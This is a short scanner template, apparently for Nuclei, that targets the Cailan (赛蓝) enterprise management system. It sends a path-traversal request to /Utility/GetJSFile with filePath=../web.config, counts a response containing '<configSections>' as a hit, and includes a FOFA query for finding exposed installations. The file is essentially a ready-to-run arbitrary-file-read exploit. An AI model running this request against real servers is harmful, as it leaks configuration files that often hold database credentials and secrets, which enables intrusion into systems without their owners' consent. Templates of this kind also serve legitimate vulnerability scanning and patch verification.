id: sailan-GetJSFile-fileread

info:
  name: 赛蓝企业管理系统-任意文件读取-GetJSFile
  author: HuanXiong
  severity: critical
  metadata: 
    fofa-query: body="www.cailsoft.com" || body="赛蓝企业管理系统"

  tags: File Reading

http:
  - raw:
      - |
        @timeout: 30s   
        GET /Utility/GetJSFile?filePath=../web.config HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
        Accept: */*
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
        Connection: close
          
        
    matchers:
      - type: dsl
        condition: and
        dsl:
          - 'status_code==200 && contains_all(body,"<configSections>")'